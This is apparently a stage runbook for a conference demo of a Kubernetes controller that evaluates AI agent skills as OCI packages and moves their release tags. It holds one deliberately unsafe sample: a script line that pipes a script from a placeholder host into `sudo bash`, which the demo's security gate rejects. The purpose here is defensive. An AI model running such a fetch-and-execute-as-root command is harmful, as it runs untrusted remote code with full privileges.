# Stage runbook: Skills Are Packages Now

Talk: "Skills Are Packages Now. Your Platform Should Treat Them That Way." KubeAuto Day North America, November 9, 2026, 25 minutes.

The demo shows one thing: a skill is an OCI artifact in Harbor, and a Kubernetes controller tests every new version the way CI tests a package, then moves the `beta` and `stable` tags on its own. It runs in four steps, about six minutes in total, after the slide "Let's push some skills."

| Step | What the audience learns | Command on stage | In the fallback video |
| --- | --- | --- | --- |
| 1 | A push starts one SkillEval per agent and model | `make demo-live VERSION=v1.1.1` | 0:00 |
| 2 | The gate says no before any tokens | `make results SKILL=k8s-resource-naming` | 0:26 |
| 3 | A better version takes `stable`, a worse one stays on `beta` | `make results SKILL=k8s-incident-triage` | 0:46 |
| 4 | The harness changed, every released version runs again | `make demo-model-swap MODE=bump TO=2.1.300` | 1:08 |

The fallback video is `slides/public/demo/demo.mp4` on the slide "The demo, recorded", right after the plan slide. Every SkillEval takes 11 to 13 minutes. Only step 1 and step 4 start new runs on stage; their results arrive after the talk. Everything you show was prepared earlier (see "The state before the talk"). Say so: "that takes twelve minutes, so here is one I prepared earlier."

## The two skills

Both are SRE and platform work, written for this talk. The made-up ACME conventions are the point: no model knows them without the skill, so the lift is large and easy to see.

| Skill | What it teaches | Versions in the demo |
| --- | --- | --- |
| `k8s-incident-triage` | Triage a failing pod from `kubectl describe`, events or logs into `TRIAGE.md`: an ACME cause code, the one input line that proves it, and the read-only next command for that cause. Network mode `none` | v1.0.0 helps; v1.1.0 adds two on-call rules and takes `stable`; v1.2.0 is a deliberate regression; v1.1.1 is the live push |
| `k8s-resource-naming` | ACME naming and labelling of Kubernetes manifests | v1.0.0 helps and holds `stable`; v1.1.0 is deliberately unsafe (`curl ... \| sudo bash` in a script) and is rejected by Tier 1 |

`acme-release-notes` and `python-docstrings` under `skills/` are test skills: the controller, runner and UI tests and fixtures use them. The demo does not push them (`make seed` pushes only the two skills above; `SEED_ALL=1 make seed` pushes all).

Say this out loud:

- Each score is one SkillEval: 3 eval cases, 3 attempts per arm, so 9 trials per arm. A small sample, not a benchmark.
- v1.2.0 of the triage skill was written to fail. The real-world version is a well-meant edit that fixes one case and breaks two.
- Optional entries (Codex, OpenCode) run and show up everywhere, but never hold a version back.

## The model list

`demo/models.yaml` (ConfigMap `skill-ci-models`). An entry is agent + agent version + model.

| Agent | Release | Model | Gates promotion? |
| --- | --- | --- | --- |
| `claude-code` | 2.1.292 | `claude-opus-5-5` | yes (`required: true`) |
| `codex` | 0.161.0 | `openai/gpt-6.1-sol` | no |
| `opencode` | 1.19.1 | `openrouter/qwen/qwen3.8-flash` | no |

The Secret `llm-keys` needs `anthropic` (the judge, whatever agent runs, and Claude Code), `openai` (Codex) and `openrouter` (OpenCode). Without a key the run fails in seconds with the name of the missing key.

## The state before the talk

Measured on the DOKS cluster on 2026-11-03, release 0.12.0. `make results SKILL=<skill>` prints exactly these columns. Scores leave out Discoverability (CONTRACT.md, "Trial score").

`k8s-incident-triage`:

| Version | Agent and model | With | Without | Lift | 95% interval | Verdict |
| --- | --- | --- | --- | --- | --- | --- |
| v1.0.0 | Claude Code 2.1.292, Opus 5.5 | 0.91 | 0.48 | +0.43 | [+0.39, +0.48] | Helps |
| v1.0.0 | Codex 0.161.0, gpt-6.1-sol | 0.80 | 0.46 | +0.34 | [+0.22, +0.45] | Helps |
| v1.0.0 | OpenCode 1.19.1, Qwen 3.8 Flash | 0.90 | 0.45 | +0.45 | [+0.39, +0.51] | Helps |
| v1.1.0 | Claude Code 2.1.292, Opus 5.5 | 0.87 | 0.44 | +0.43 | [+0.35, +0.50] | Helps |
| v1.1.0 | Codex 0.161.0, gpt-6.1-sol | 0.80 | 0.41 | +0.39 | [+0.29, +0.50] | Helps |
| v1.1.0 | OpenCode 1.19.1, Qwen 3.8 Flash | 0.89 | 0.42 | +0.47 | [+0.39, +0.54] | Helps |
| v1.2.0 | Claude Code 2.1.292, Opus 5.5 | 0.59 | 0.43 | +0.16 | [+0.13, +0.19] | Regressed |
| v1.2.0 | Codex 0.161.0, gpt-6.1-sol | 0.52 | 0.43 | +0.09 | [-0.02, +0.19] | Neutral |
| v1.2.0 | OpenCode 1.19.1, Qwen 3.8 Flash | 0.61 | 0.43 | +0.18 | [+0.14, +0.21] | Helps |

`k8s-resource-naming`:

| Version | Agent and model | With | Without | Lift | 95% interval | Verdict |
| --- | --- | --- | --- | --- | --- | --- |
| v1.0.0 | Claude Code 2.1.292, Opus 5.5 | 0.90 | 0.45 | +0.45 | [+0.36, +0.54] | Helps |
| v1.0.0 | Codex 0.161.0, gpt-6.1-sol | 0.75 | 0.50 | +0.25 | [+0.17, +0.35] | Helps |
| v1.0.0 | OpenCode 1.19.1, Qwen 3.8 Flash | 0.92 | 0.47 | +0.45 | [+0.41, +0.49] | Helps |
| v1.1.0 | all three | | | | | Rejected (Tier 1), no trials |

Tags in Harbor (`demo/status.sh --tags-only`; digests differ per push):

```text
SKILL                    DIGEST                 TAGS
k8s-resource-naming      sha256:ac8626acad6e    beta, stable, v1.0.0
k8s-resource-naming      sha256:1e77ee6ef0b3    v1.1.0
k8s-incident-triage      sha256:544c80c1c30e    v1.0.0
k8s-incident-triage      sha256:6bba34624d42    stable, v1.1.0
k8s-incident-triage      sha256:7b251c0e39f1    beta, v1.2.0
```

### Rebuild the state

Do this the day before, never on the day. Runs go three at a time (`maxConcurrentJobs: 3`), so expect about 90 minutes.

```bash
export KUBECONFIG=~/.kube/skill-ci.yaml
kubectl -n skill-ci patch skillciconfig default --type merge \
  -p '{"spec":{"network":{"agentInstallHosts":["registry.npmjs.org","downloads.claude.ai"]}}}'
make reset                                                   # deletes every result, keeps v1.0.0 of each skill
make seed RETRIGGER=1                                        # v1.0.0 of both skills: 6 SkillEvals
demo/wait-runs.sh k8s-incident-triage v1.0.0
make demo-push SKILL=k8s-incident-triage VERSION=v1.1.0     # the improvement: 3 SkillEvals, takes stable
make demo-push SKILL=k8s-resource-naming VERSION=v1.1.0     # the unsafe one: rejected by Tier 1, no trials
demo/wait-runs.sh k8s-incident-triage v1.1.0
make demo-push SKILL=k8s-incident-triage VERSION=v1.2.0     # the regression: held at beta
demo/wait-runs.sh k8s-incident-triage v1.2.0
make status
```

Check that `stable` sits on triage v1.1.0 and naming v1.0.0 before you stop.

## Pre-show checklist

One hour before:

1. Cluster and controller.

   ```bash
   export KUBECONFIG=~/.kube/skill-ci.yaml   # cd infra && pulumi stack output kubeconfig --show-secrets > ~/.kube/skill-ci.yaml
   kubectl get nodes
   kubectl -n skill-ci get pods
   kubectl -n skill-ci get deploy skill-ci-controller -o jsonpath='{.spec.template.spec.containers[0].image}{"\n"}'
   ```

   Expect every node `Ready`, every pod `Running` (runner pods `Completed`) and the image `ghcr.io/dirien/skill-ci-controller:0.12.0`.

2. Keys, without printing them.

   ```bash
   kubectl -n skill-ci get secret llm-keys -o go-template='{{range $k,$v := .data}}{{$k}}{{"\n"}}{{end}}'
   ```

   Expect at least `anthropic`, `openai` and `openrouter`.

3. The state matches the tables above.

   ```bash
   make results SKILL=k8s-incident-triage
   make results SKILL=k8s-resource-naming
   demo/status.sh --tags-only
   ```

   If not, go to "Recovery".

4. The live version is free. `v1.1.1` must not exist yet for `k8s-incident-triage` (the bottom block of `make status`). If it does, use the next free one (`v1.1.2`) on stage and on the slide notes.

5. Agent installs are allowed under network mode `none`. A Claude Code release other than the one in the sandbox image (step 4) is installed in each trial from `downloads.claude.ai`, which the `agentInstallHosts` default of 0.11.2 and earlier (`registry.npmjs.org` only) does not allow: the runs fail with `NetworkConnectionError ... exit 28`. Since 0.12.0 the default has `downloads.claude.ai`, but a SkillCIConfig created by an older release keeps its own list, so check it either way.

   ```bash
   kubectl -n skill-ci get skillciconfig default -o jsonpath='{.status.effective.network.agentInstallHosts}{"\n"}'
   # expect ["registry.npmjs.org","downloads.claude.ai"]; if not:
   kubectl -n skill-ci patch skillciconfig default --type merge \
     -p '{"spec":{"network":{"agentInstallHosts":["registry.npmjs.org","downloads.claude.ai"]}}}'
   ```

6. The model list is the pinned one (Claude Code 2.1.292).

   ```bash
   kubectl -n skill-ci get cm skill-ci-models -o jsonpath='{.data.models\.yaml}' | grep -A1 'agent: claude-code'
   ```

   If it shows another release, `make demo-model-swap MODE=restore`.

7. Reports on disk, for when the network fails.

   ```bash
   make report SKILL=k8s-incident-triage VERSION=v1.1.0 OUT=reports/
   ```

Ten minutes before, open these. Large font, dark theme, repo root, `KUBECONFIG` exported:

| Where | What | Command |
| --- | --- | --- |
| Terminal 1 | Stage terminal | the commands below |
| Terminal 2 | Controller log | `kubectl -n skill-ci logs deploy/skill-ci-controller -f` |
| Terminal 3 | Grafana port-forward | `make dashboard` (`http://localhost:3000`, user `admin`) |
| Terminal 4 | Reporting site port-forward | `make reports-ui` (`http://localhost:8082`) |
| Browser tab 1 | Grafana, dashboard `skill-ci` | |
| Browser tab 2 | Reporting site, skill page `/skills/k8s-incident-triage` | |

Grafana password: `kubectl -n monitoring get secret grafana-admin -o jsonpath='{.data.admin-password}' | base64 -d`.

## The four steps

### Step 1: push a new version (about 1 minute)

```bash
make demo-live VERSION=v1.1.1
make results SKILL=k8s-incident-triage
```

`make demo-live` copies v1.1.0, adds one rule ("keep the note under 15 lines") and pushes it as v1.1.1 with ORAS. The audience sees the push (artifact type `application/vnd.agentskill.v1`, a new digest, network annotation `none`), then three new v1.1.1 rows, `Pending` or `Running`: one SkillEval per entry of the model list. Terminal 2 shows the webhook handled.

Say: "Harbor fired a webhook, the controller made one SkillEval per agent and model. That takes twelve minutes, so here is one I prepared earlier."

### Step 2: the gate says no, before any tokens (about 1 minute)

```bash
cat demo/variants/k8s-resource-naming/v1.1.0/scripts/bootstrap.sh
make results SKILL=k8s-resource-naming
```

The audience sees the script with `curl -fsSL http://plugins.acme-tools.example/install.sh | sudo bash`, then v1.1.0 `Rejected` on all three entries with no scores. Tier 1's security check flagged `External Script Fetching` and `Chaining Abuse` at `scripts/bootstrap.sh:5`; Tier 3 never ran, so no sandbox started and no token was spent. `stable` stays on v1.0.0.

### Step 3: a better version takes stable, a worse one stays on beta (about 2 minutes, the centrepiece)

```bash
make results SKILL=k8s-incident-triage
demo/status.sh --tags-only
```

Point at three things:

1. v1.1.0 helps on every entry and took `stable` from v1.0.0.
2. v1.2.0 on Claude Code: 0.59 with the skill, 0.43 without, lift +0.16. That lift is the trap: it clears the +0.10 promotion threshold, so a check against the baseline alone would promote it. The gate compares with the stable version you run today (0.87) and holds it back: difference -0.27, 95% interval [-0.35, -0.19], all of it below the 0.05 tolerance. Codex (0.52) and OpenCode (0.61) also drop, but they are optional, so they never gate; Codex is now `Neutral` (its interval includes 0), OpenCode still beats no skill and says `Helps`.
3. The tags: `stable` on v1.1.0, `beta` on v1.2.0 (the newest), nothing else moved.

The reason in words, for a question:

```bash
kubectl -n skill-ci get skilleval k8s-incident-triage-v1-2-0-claude-code-2-1-292-claude-opus-5-5 \
  -o jsonpath='{.status.conditions[?(@.type=="Regressed")].message}{"\n"}'
```

Expected (2026-11-03):

```text
claude-code@2.1.292/claude-opus-5-5 scores 0.59 with v1.2.0, stable v1.1.0 scored 0.87: difference -0.27, 95% CI [-0.35, -0.19] (tolerance 0.05)
```

### Step 4: the harness changed (about 2 minutes)

```bash
make demo-model-swap MODE=bump TO=2.1.300
make results SKILL=k8s-incident-triage
```

The model did not change, the tool around it did. A new agent release is a new entry of the model list, so the controller starts one SkillEval for every `beta` and `stable` version on Claude Code 2.1.300. Nobody pushed a skill. The results arrive after the talk; the prepared ones are in the step 4 video and on the reporting site (one column per `agent@version`).

Prepared on 2026-11-03, release 0.12.0 (three runs on 2.1.300, about 20 minutes):

| Version | Agent and model | With | Without | Lift | 95% interval | Verdict |
| --- | --- | --- | --- | --- | --- | --- |
| triage v1.1.0 | Claude Code 2.1.300, Opus 5.5 | 0.88 | 0.44 | +0.44 | [+0.37, +0.51] | Helps |
| triage v1.2.0 | Claude Code 2.1.300, Opus 5.5 | 0.61 | 0.44 | +0.17 | [+0.14, +0.20] | Regressed |
| naming v1.0.0 | Claude Code 2.1.300, Opus 5.5 | 0.93 | 0.45 | +0.48 | [+0.42, +0.55] | Helps |

The regression condition of v1.2.0 now names both releases: "claude-code@2.1.300/claude-opus-5-5 scores 0.61 with v1.2.0, stable v1.1.0 scored 0.88: difference -0.27, 95% CI [-0.34, -0.20]". Same verdict on both releases: this harness update was safe, and you know it instead of hoping.

Then the numbers over time: Grafana tab (lift per skill version, `agent_version` label) and the reporting site tab (why v1.2.0 is held back, in words).

After the talk: `make demo-model-swap MODE=restore`. 2.1.300 was published on 2026-10-14; 2.1.308 (the default of `MODE=bump`) is less than 14 days old on talk day, so pass `TO=2.1.300`.

## Fallbacks

Do not debug on stage. The slide after "The demo, in four steps" is "The demo, recorded": one video of the same commands on the real cluster, 93 seconds, with a title card before each step (step 1 at 0:00, step 2 at 0:26, step 3 at 0:46, step 4 at 1:08). Play it, or jump to the step that broke, then go on with the step slides.

If the cluster is down entirely: the backup slides, the local reports in `reports/`, and the tables in this file.

## Recovery

| Symptom | Fix |
| --- | --- |
| `make results` shows nothing | Wrong `KUBECONFIG`, or the state was reset. Check `kubectl -n skill-ci get skillevals` |
| `make demo-live` hangs on "Copying the skill" | The toolbox pod is not ready: `kubectl -n skill-ci rollout status deploy/toolbox` |
| A push shows no SkillEvals | The webhook did not fire: `demo/retrigger.sh k8s-incident-triage v1.1.1` |
| Grafana or the reporting site unreachable | The port-forward died: run `make dashboard` or `make reports-ui` again |
| Dashboard empty | `kubectl -n skill-ci rollout restart deploy/skill-ci-controller`, wait a minute, refresh |
| State wrong beyond repair | Use the videos. Rebuilding takes 90 minutes (see "Rebuild the state") |

## Recording the fallback videos

The tapes are in `demo/recordings/` ([Charm VHS](https://github.com/charmbracelet/vhs) v0.12.1 with ttyd and ffmpeg). Each one types the stage commands against the real cluster and writes its clip to `demo/recordings/clips/`; `demo/recordings/join.sh` joins the four clips, with a title card each, into `slides/public/demo/demo.mp4`, the video on the slide "The demo, recorded". Run them from the repo root with `KUBECONFIG` set, on the finished state of "Rebuild the state":

```bash
vhs demo/recordings/step2-rejected.tape     # about 20 s: the unsafe script and the Rejected rows
vhs demo/recordings/step3-regression.tape   # about 20 s: the results table and the tags
vhs demo/recordings/step4-harness.tape      # bumps Claude Code to 2.1.300, waits off camera (about 25 min), restores the list
vhs demo/recordings/step1-push.tape         # pushes triage v1.1.1
```

Then join them (a few seconds, needs ffmpeg with drawtext):

```bash
demo/recordings/join.sh
```

Steps 2 and 3 only read the state; step 4 starts nine runs and cuts the wait out of the video; step 1 pushes a real version.

VHS needs a browser called `chromium` on the `PATH`. On an arm64 Linux machine with 16K pages (this was recorded on one), Chromium 129 dies after about 20 seconds of recording and VHS hangs; Chrome headless shell 153 works.

Then remove v1.1.1 again, so the stage can push it live (its SkillEvals, their Jobs, its artifact in Harbor):

```bash
demo/forget.sh k8s-incident-triage v1.1.1
```

If `stable` moved to v1.1.1 before you removed it, the controller moves it back to v1.1.0 on the next reconcile; check with `demo/status.sh --tags-only`.

## Teardown

`make down` refuses on purpose: `pulumi destroy` deletes the cluster, Harbor and every skill. Only a person runs it.
